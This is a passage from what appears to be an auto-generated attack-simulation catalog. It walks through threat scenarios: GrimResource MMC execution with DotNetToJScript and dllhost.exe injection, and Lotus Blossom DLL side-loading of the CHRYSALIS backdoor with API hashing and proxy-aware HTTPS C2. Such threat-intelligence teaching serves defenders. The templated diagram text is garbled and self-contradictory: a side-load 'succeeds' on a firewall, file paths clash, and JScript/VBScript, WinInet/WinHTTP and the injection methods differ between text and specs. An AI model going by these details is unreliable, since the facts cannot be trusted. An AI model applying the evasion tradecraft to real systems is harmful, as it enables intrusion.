  - Stage 2 (T1059.005 · Command and Scripting Interpreter: Visual Basic): **XSLT TRANSFORMNODE & DOTNETTOJSCRIPT CLR LOAD** — Once the legacy script starts running inside mmc.exe, it acts like a 3D printer inside the building: it reads an encoded blueprint from the binder and materializes a full .NET loader (BinaryFormatter.Deserialize) directly in RAM. Plain JScript cannot call low-level Windows memory APIs directly, so the script inside mmc.exe uses the DotNetToJScript technique: it creates a .NET BinaryFormatter COM object via ActiveX (new ActiveXObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")) and deserializes a Base64-encoded .NET assembly ("GrimLoader") directly in RAM (allowing the attacker to bridge from limited JScript into a full .NET program with complete Win32 API access inside mmc.exe, without ever dropping a .dll or .exe file onto the hard drive). Deserializing a crafted gadget chain via BinaryFormatter loads the .NET Common Language Runtime (clr.dll / mscoree.dll) into mmc.exe and invokes Assembly.Load(byte[]) in memory (giving the attacker full P/Invoke access to kernel32.dll and ntdll.dll from inside a Microsoft-signed console process). On the diagram, follow Step #2 / Link #2 (#2→ DOTNETTOJSCRIPT / ⇠#2 ACK In-Memory CLR) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 mmc.exe (Management Console)), monitored by Node ⑥ (#6 Elastic Defend & SIEM). [Specs: EXECUTION BRIDGE=MSXML transformNode -> Embedded XSLT VBScript; IN-MEMORY LOADER=DotNetToJScript (BinaryFormatter Deserialization); CLR ARTIFACT=mmc.exe loads clr.dll & mscoree.dll (Unusual for non-.NET snap-in)]
  - Stage 3 (T1055.002 · Process Injection: Portable Executable Injection): **SACRIFICIAL DLLHOST.EXE SPAWN & INDIRECT SYSCALL INJECTION** — Finally, so the employee can close the Settings Binder without killing the malware, the in-memory loader spawns a quiet background helper (dllhost.exe) and hands the active C2 radio over to it. If the victim notices an empty console window and clicks "X" to close mmc.exe, any malware running inside mmc.exe would die immediately. To survive, the in-memory .NET loader spawns a hidden background C:\Windows\System32\dllhost.exe process (COM Surrogate, a legitimate Windows background host that runs without a visible taskbar window), maps a shared Read-Write-Execute memory section via NtCreateSection / NtMapViewOfSection ("RwSection" technique documented by Elastic Security Labs, avoiding suspicious VirtualAllocEx calls), and injects the Cobalt Strike C2 beacon into dllhost.exe. Migrating execution from the interactive mmc.exe process into a headless dllhost.exe process via shared section mapping (RwSection) or Asynchronous Procedure Call (NtQueueApcThread) ensures the C2 beacon stays alive in the background long after the victim closes the .msc window. In the documented Sysmon EID 1 & 8 exchange from mmc.exe (Management Console) to apds.dll & DotNetToJScript, apds.dll & DotNetToJScript responds with ACK PID 6088 (confirming that the INJECT DLLHOST.EXE request succeeded on apds.dll & DotNetToJScript and completing the final execution objective of Elastic Security Labs, GrimResource: MMC & apds.dll XSS-to-RCE Execution). On the diagram, follow Step #3 / Link #3 (#3→ INJECT DLLHOST.EXE / ⇠#3 ACK PID 6088) from Node ③ (#3 mmc.exe (Management Console)) to Node ④ (#4 apds.dll & DotNetToJScript), monitored by Node ⑥ (#6 Elastic Defend & SIEM). [Specs: PARENT -> CHILD=mmc.exe (PID 5412) -> dllhost.exe (PID 6088); INJECTION METHOD=Indirect Syscalls (NtAllocateVirtualMemory + NtWriteVirtualMemory); DETECTION SIGNAL=Sysmon EID 1 (mmc->dllhost) + EID 7 (apds.dll)]

### T1574.002: Elastic Security Labs — Lotus Blossom APT: WinGUp DLL Side-Loading & CHRYSALIS Backdoor
- **Scenario ID**: `elastic-lotus-blossom-chrysalis`
- **Canonical URL**: https://attackexplorer.org/scenarios/elastic-lotus-blossom-chrysalis
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=elastic-lotus-blossom-chrysalis
- **Category**: MALWARE | **Severity**: CRITICAL
- **Subtitle**: Elastic Security Labs · GUP.exe libcurl.dll Side-Loading, MurmurHash API & CHRYSALIS Implant
- **Overview**: Imagine a celebrity who only travels with their trusted personal assistant (mpclient.dll / libcurl.dll). Windows has a habit of checking the hotel lobby (the current folder) for the assistant before checking the official headquarters (System32). The attacker places an imposter wearing a name tag that says mpclient.dll right in the lobby next to a genuine, digitally signed program (MsMpEng.exe or Notepad++ GUP.exe). When the genuine program starts up, it hires the imposter standing right next to it. Synthesizing independent reports from Elastic Security Labs (who dissected the Notepad++ WinGUp GUP.exe + libcurl.dll + CHRYSALIS chain) and Cisco Talos (who documented the MsMpEng.exe + mpclient.dll + Sagerunex lineage), the Lotus Blossom APT group (Billbug / Spring Dragon / G0030) relies on a 3-piece DLL Side-Loading triad (MITRE T1574.002). Instead of running an unsigned malware .exe that EDR agents would block, the attacker drops a genuine, digitally signed executable (GUP.exe or MsMpEng.exe, chosen because its valid digital signature passes application-allowlisting checks) alongside a maliciously crafted companion DLL (libcurl.dll or mpclient.dll, loaded automatically from the current directory) and an RC4/XOR-encrypted payload file (chrysalis.dat / conf.bin, keeping the real backdoor scrambled on disk).
- **MITRE ATT&CK Techniques**: T1574.002 (Hijack Execution Flow: DLL Side-Loading (WinGUp GUP.exe + libcurl.dll) - Persistence / Defense Evasion), T1055 (In-Memory Shellcode Decryptor (CHRYSALIS Backdoor) - Defense Evasion)
- **Primary Analytical Sources**: Elastic Security Labs: Lotus Blossom Espionage Intrusion Analysis: Sagerunex & CHRYSALIS Loader Chains (https://www.elastic.co/security-labs) | Cisco Talos Intelligence Group: Lotus Blossom (Spring Dragon / Billbug) Sagerunex Backdoor & DLL Side-Loading Tradecraft (https://blog.talosintelligence.com/) | The MITRE Corporation: MITRE ATT&CK Group G0030: Lotus Blossom (Spring Dragon / Billbug) (https://attack.mitre.org/groups/G0030/)
- **Kill-Chain Stages**:
  - Stage 1 (T1574.002 · Hijack Execution Flow: DLL Side-Loading): **WINGUP (GUP.EXE) DLL SIDE-LOADING OF LIBCURL.DLL** — The intruder drops a 3-piece kit into a quiet folder (C:\ProgramData\Comms\): (1) a real, digitally signed executable, (2) a trojanized helper library with the exact name the executable looks for (mpclient.dll / libcurl.dll), and (3) a locked box of encrypted shellcode (chrysalis.dat). Across campaigns analyzed by Elastic Security Labs and Cisco Talos, the attacker stages a 3-file triad inside a writable folder like C:\ProgramData\Comms\: (1) a genuine, digitally signed executable (such as Microsoft’s MsMpEng.exe or Notepad++ WinGUp GUP.exe, authentic signed binaries whose valid digital certificates prevent antivirus from blocking the .exe launch), (2) a malicious companion DLL named mpclient.dll or libcurl.dll placed in that exact same folder (exploiting Windows’ default DLL search order, which checks the application’s current directory before C:\Windows\System32), and (3) an encrypted data file named chrysalis.dat or conf.bin (containing the actual backdoor in scrambled form so static file scanners see only random bytes). When the signed host binary starts from C:\ProgramData\Comms\, the Windows loader (ntdll!LdrLoadDll) resolves its Import Address Table (IAT), sees an import for mpclient.dll / libcurl.dll, finds the attacker’s unsigned DLL sitting in the local directory first, and maps it directly into the trusted process. In the documented Sysmon EID 7 exchange from Lotus Blossom C2 Server to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK Unsigned DLL (confirming that the SIDELOAD LIBCURL request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 FNV-1A / MURMURHASH API RESOLUTION & CHRYSALIS DECRYPTION). On the diagram, follow Step #1 / Link #1 (#1→ SIDELOAD LIBCURL / ⇠#1 ACK Unsigned DLL) from Node ① (#1 Lotus Blossom C2 Server) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Elastic Security EDR & SIEM). [Specs: HOST BINARY=C:\ProgramData\NotepadPlus\GUP.exe (Signed WinGUp); SIDE-LOADED DLL=C:\ProgramData\NotepadPlus\libcurl.dll (Unsigned); HIJACKED EXPORT=curl_easy_init / curl_easy_perform]
  - Stage 2 (T1027.007 · Obfuscated Files or Information: Dynamic API Resolution): **FNV-1A / MURMURHASH API RESOLUTION & CHRYSALIS DECRYPTION** — Once the imposter assistant (mpclient.dll / libcurl.dll) is invited inside the VIP suite, they quietly unlock the third file (chrysalis.dat) in memory, so no antivirus scanner looking at the hard drive ever sees the real weapon. Once the signed binary loads the trojanized DLL and calls its exported startup function (keeping the malicious DLL tiny and using custom 32-bit API hashing instead of plaintext function names like VirtualAlloc so static analysts see no suspicious imports), the DLL opens the companion file chrysalis.dat / conf.bin from disk, decrypts its bytes in RAM using a custom RC4/XOR key, and copies the unpacked Chrysalis / Sagerunex shellcode into an executable memory buffer (meaning the actual APT backdoor code only ever exists in volatile memory, never unencrypted on the hard drive). Splitting the infection chain across three files (a clean signed .exe, a minimal loader .dll using API hashing, and an encrypted .dat/.bin blob) defeats traditional signature scanners: the .exe is 100% legitimate, the .dll contains only a simple file-read and XOR/RC4 loop, and the .dat file has no PE header ("MZ") on disk. On the diagram, follow Step #2 / Link #2 (#2→ CHRYSALIS UNPACK / ⇠#2 ALERT 164 KB RWX) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 GUP.exe (Signed WinGUp)), monitored by Node ⑥ (#6 Elastic Security EDR & SIEM). [Specs: API HASHING=FNV-1a (0x811C9DC5) & MurmurHash3 PEB Export Resolution; PAYLOAD BLOB=C:\ProgramData\NotepadPlus\gup.dat (Encrypted Shellcode); MEMORY PROTECTION=VirtualAlloc (MEM_COMMIT | PAGE_EXECUTE_READWRITE)]
  - Stage 3 (T1071.001 · Application Layer Protocol: Web Protocols): **CHRYSALIS HTTPS C2 BEACON & INTERACTIVE RECON** — Wearing the trusted program’s badge, the decrypted backdoor reads the employee’s own internet proxy pass from Windows (WinInet) and blends its outbound HTTPS messages right into normal office web traffic. Running inside the trusted host binary, the decrypted Chrysalis/Sagerunex implant registers a persistent Windows service or Registry Run key (pointing to the legitimate signed .exe so startup monitors see a signed binary), and calls Windows WinInet APIs (InternetOpenW and HttpSendRequestW, chosen instead of raw sockets because WinInet automatically reads the logged-in employee’s corporate proxy settings and cached NTLM/Kerberos credentials, allowing the C2 beacon to pass right through strict enterprise web proxies). In many enterprise networks, direct outbound TCP/443 connections are blocked unless traffic authenticates through a corporate HTTP proxy. Using WinInet with INTERNET_OPEN_TYPE_PRECONFIG lets the malware piggyback on Windows’ built-in proxy configuration and user credentials automatically. In the documented Sysmon EID 3 exchange from GUP.exe (Signed WinGUp) to libcurl.dll & CHRYSALIS RAM, libcurl.dll & CHRYSALIS RAM responds with ACK TLS 1.2 (confirming that the HTTPS C2 BEACON request succeeded on libcurl.dll & CHRYSALIS RAM and completing the final execution objective of Elastic Security Labs, Lotus Blossom APT: WinGUp DLL Side-Loading & CHRYSALIS Backdoor). On the diagram, follow Step #3 / Link #3 (#3→ HTTPS C2 BEACON / ⇠#3 ACK TLS 1.2) from Node ③ (#3 GUP.exe (Signed WinGUp)) to Node ④ (#4 libcurl.dll & CHRYSALIS RAM), monitored by Node ⑥ (#6 Elastic Security EDR & SIEM). [Specs: C2 PROTOCOL=HTTPS TLS 1.2 (WinHTTP API from GUP.exe); BACKDOOR FAMILY=CHRYSALIS (Lotus Blossom / Billbug); CAPABILITIES=Reverse Shell, File Manager, Process Enumeration, C2 Sleep]

### T1078.004: Unit 42 & CISA — Scattered Spider (Muddled Libra): SSO MFA Fatigue, RMM & AWS/ESXi Pivot
- **Scenario ID**: `unit42-scattered-spider-cloud`
- **Canonical URL**: https://attackexplorer.org/scenarios/unit42-scattered-spider-cloud
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=unit42-scattered-spider-cloud
- **Category**: ACTIVE_DIRECTORY | **Severity**: CRITICAL
- **Subtitle**: Palo Alto Unit 42 / CISA AA23-320A · Okta Identity Takeover, FleetDeck RMM & Cloud SAML Pivot
